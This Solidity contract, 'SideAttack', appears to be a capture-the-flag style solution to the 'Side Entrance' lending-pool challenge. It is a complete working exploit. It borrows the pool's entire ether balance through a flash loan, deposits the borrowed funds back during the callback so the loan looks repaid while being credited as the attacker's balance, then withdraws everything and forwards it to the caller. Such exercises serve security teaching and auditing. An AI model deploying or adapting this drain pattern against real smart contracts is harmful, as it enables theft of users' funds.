// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract SideAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
        (bool s,) = payable(msg.sender).call{value: address(this).balance}("");
        require(s);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
